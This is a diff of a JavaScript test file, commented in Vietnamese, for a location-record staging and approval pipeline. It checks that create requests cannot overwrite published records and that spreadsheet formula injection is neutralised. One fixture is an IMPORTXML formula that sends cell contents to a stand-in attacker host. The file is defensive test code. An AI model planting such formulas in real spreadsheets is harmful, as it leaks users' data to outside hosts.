@@ -125,12 +125,20 @@ test('sanitizes spreadsheet formula injection for user-controlled values only', 
 });
 
 test('vô hiệu hoá công thức nhập qua target_record_id và record_id kế thừa từ nó', () => {
-    // `target_record_id` là ô nhập tự do trong Form; `recordId = submission.targetRecordId || ...`
-    // nên công thức đi thẳng vào cột record_id của Location_Staging rồi sang Published_Locations.
+    // `target_record_id` là ô nhập tự do trong Form nên giá trị vẫn được ghi xuống Location_Staging
+    // dù request bị block — cột đó phải được vô hiệu hoá công thức.
     const formula = '=IMPORTXML("https://evil.example/?d="&A1,"//a")';
-    const record = stage(submission({ requestId: 'REQ_FORMULA_TARGET', targetRecordId: formula }));
-    assert.equal(record.record_id, `'${formula}`);
-    assert.equal(record.target_record_id, `'${formula}`);
+    const created = stage(submission({ requestId: 'REQ_FORMULA_TARGET', targetRecordId: formula }));
+    assert.equal(created.target_record_id, `'${formula}`);
+    // Từ khi có bất biến CREATE, create không còn kế thừa target làm record_id nữa.
+    assert.match(created.record_id, /^CA_TIEN_CAT_/);
+
+    // Nhánh không-create vẫn lấy record_id từ target, nên đây mới là chỗ công thức lọt vào record_id.
+    const updated = stage(submission({
+        requestId: 'REQ_FORMULA_UPDATE', requestType: pipeline.REQUEST_TYPES.update, targetRecordId: formula,
+    }));
+    assert.equal(updated.record_id, `'${formula}`);
+    assert.equal(updated.target_record_id, `'${formula}`);
 
     // Ca dương: record_id do pipeline sinh ra không bao giờ bị thêm dấu nháy oan.
     const normal = stage(submission({ requestId: 'REQ_PLAIN' }));
@@ -246,18 +254,18 @@ test('cán bộ đơn vị A không update được record đã publish của đ
     assert.deepEqual([victim], snapshot, 'Published_Locations không được đổi');
 });
 
+// Case B: create + target của ĐƠN VỊ KHÁC. Dính cả hai rule; điều bắt buộc là không PENDING.
 test('yêu cầu create mang sẵn target_record_id của đơn vị khác cũng bị chặn', () => {
-    // requiresExistingTarget(create) = false nên hai rule target cũ đều bỏ qua nhánh này, nhưng
-    // buildStagingRecord vẫn lấy target_record_id làm record_id => khi duyệt sẽ ghi đè bản ghi đó.
     const victim = publishedVanPhuRecord();
     const record = stageTwoUnit(submission({
         requestId: 'REQ_CROSS_CREATE', requestType: pipeline.REQUEST_TYPES.create,
         targetRecordId: victim.record_id, locationName: 'Điểm mới nhưng cướp record_id',
     }), [victim]);
 
-    assert.equal(record.record_id, victim.record_id, 'tiền đề: record_id vẫn bị kế thừa từ target');
     assert.equal(record.status, pipeline.STATUSES.blocked);
+    assert.match(record.validation_errors, /CREATE_TARGET_RECORD_ID_NOT_ALLOWED/);
     assert.match(record.validation_errors, /TARGET_RECORD_UNIT_MISMATCH/);
+    assert.notEqual(record.record_id, victim.record_id, 'create không được kế thừa record_id của target');
 });
 
 test('yêu cầu stop cross-unit bị chặn ở cả staging lẫn khâu duyệt', () => {
@@ -337,4 +345,88 @@ test('so khớp chủ sở hữu bỏ qua hoa thường/khoảng trắng nhưng 
     }), [orphan]);
     assert.equal(blocked.status, pipeline.STATUSES.blocked);
     assert.match(blocked.validation_errors, /TARGET_RECORD_UNIT_MISMATCH/);
+});
+
+// --- Bất biến CREATE ------------------------------------------------------------------------
+// "Thêm địa điểm mới" phải luôn tạo bản ghi mới. Một CREATE mang target_record_id là mâu thuẫn
+// ngữ nghĩa và trước đây đi lọt tới PENDING rồi ghi đè bản ghi đang publish khi được duyệt.
+
+// Case A: create + target CÙNG đơn vị — ca mà guard cross-unit không bắt được.
+test('create mang target_record_id của chính đơn vị mình bị chặn, không ghi đè bản ghi đang publish', () => {
+    const created = stageTwoUnit(submission({ requestId: 'REQ_OWN_1', locationName: 'Trụ sở Tiên Cát' }));
+    const state = pipeline.applyApproval(
+        { stagingRecords: [created], publishedRecords: [], auditEntries: [] },
+        created.request_id, 'reviewer@example.gov.vn', '', NOW,
+    );
+    const existing = state.publishedRecords[0];
+    const snapshot = JSON.parse(JSON.stringify(state.publishedRecords));
+
+    const record = stageTwoUnit(submission({
+        requestId: 'REQ_CREATE_TARGET', requestType: pipeline.REQUEST_TYPES.create,
+        targetRecordId: existing.record_id, locationName: 'Điểm CCCD mới',
+    }), state.publishedRecords);
+
+    assert.equal(record.status, pipeline.STATUSES.blocked);
+    assert.match(record.validation_errors, /CREATE_TARGET_RECORD_ID_NOT_ALLOWED/);
+    assert.doesNotMatch(record.validation_errors, /TARGET_RECORD_UNIT_MISMATCH/, 'cùng đơn vị nên guard cross-unit không kích hoạt');
+    assert.notEqual(record.record_id, existing.record_id);
+
+    // Duyệt thử: bị chặn ở RECORD_INVALID và Published_Locations không đổi.
+    assert.throws(
+        () => pipeline.applyApproval({ stagingRecords: [record], publishedRecords: state.publishedRecords, auditEntries: [] }, record.request_id, 'reviewer@example.gov.vn', '', NOW),
+        /RECORD_INVALID/,
+    );
+    assert.deepEqual(state.publishedRecords, snapshot, 'Published_Locations không được đổi');
+
+    // Chốt chặn thứ hai: kể cả khi người duyệt xoá tay ô validation_errors trong Sheet.
+    const tampered = { ...record, validation_errors: '' };
+    assert.throws(
+        () => pipeline.applyApproval({ stagingRecords: [tampered], publishedRecords: state.publishedRecords, auditEntries: [] }, tampered.request_id, 'reviewer@example.gov.vn', '', NOW),
+        /CREATE_TARGET_RECORD_ID_NOT_ALLOWED/,
+    );
+    assert.deepEqual(state.publishedRecords, snapshot, 'Published_Locations vẫn không đổi sau khi tamper');
+});
+
+// Case C: CREATE bình thường.
+test('create không có target_record_id vào PENDING với record_id do pipeline sinh', () => {
+    const record = stageTwoUnit(submission({ requestId: 'REQ_PLAIN_CREATE', locationName: 'Trụ sở Tiên Cát' }));
+    assert.equal(record.status, pipeline.STATUSES.pending);
+    assert.equal(record.validation_errors, '');
+    assert.equal(record.target_record_id, '');
+    assert.match(record.record_id, /^CA_TIEN_CAT_/, 'id do buildRecordId sinh từ unit_code đã authorize');
+});
+
+// Case D: hai CREATE cùng đơn vị.
+test('hai create cùng đơn vị sinh hai record_id khác nhau và không đè nhau', () => {
+    const a = stageTwoUnit(submission({ requestId: 'REQ_A2', locationName: 'Trụ sở A' }));
+    const b = stageTwoUnit(submission({ requestId: 'REQ_B2', locationName: 'Điểm CCCD B', services: ['CITIZEN_ID'], coordinates: '21.3235,105.4027' }));
+    assert.notEqual(a.record_id, b.record_id);
+
+    let state = { stagingRecords: [a, b], publishedRecords: [], auditEntries: [] };
+    state = pipeline.applyApproval(state, a.request_id, 'reviewer@example.gov.vn', '', NOW);
+    state = pipeline.applyApproval(state, b.request_id, 'reviewer@example.gov.vn', '', NOW);
+    assert.equal(state.publishedRecords.length, 2);
+    assert.deepEqual(state.publishedRecords.map(r => r.unit_code), ['CA_TIEN_CAT', 'CA_TIEN_CAT']);
+});
+
+// Case E: bất biến CREATE không được làm hỏng UPDATE.
+test('update đúng record cùng đơn vị không bị bất biến CREATE chặn nhầm', () => {
+    const created = stageTwoUnit(submission({ requestId: 'REQ_E1', locationName: 'Trụ sở Tiên Cát' }));
+    let state = pipeline.applyApproval(
+        { stagingRecords: [created], publishedRecords: [], auditEntries: [] },
+        created.request_id, 'reviewer@example.gov.vn', '', NOW,
+    );
+    const own = state.publishedRecords[0];
+
+    const update = stageTwoUnit(submission({
+        requestId: 'REQ_E2', requestType: pipeline.REQUEST_TYPES.update, targetRecordId: own.record_id,
+        locationName: 'Trụ sở Tiên Cát', address: 'Địa chỉ đã cập nhật',
+    }), state.publishedRecords);
+    assert.equal(update.validation_errors, '');
+    assert.equal(update.record_id, own.record_id, 'update vẫn giữ record_id của bản ghi đích');
+
+    state.stagingRecords.push(update);
+    state = pipeline.applyApproval(state, update.request_id, 'reviewer@example.gov.vn', '', NOW);
+    assert.equal(state.publishedRecords.length, 1);
+    assert.equal(state.publishedRecords[0].address, 'Địa chỉ đã cập nhật');
 });
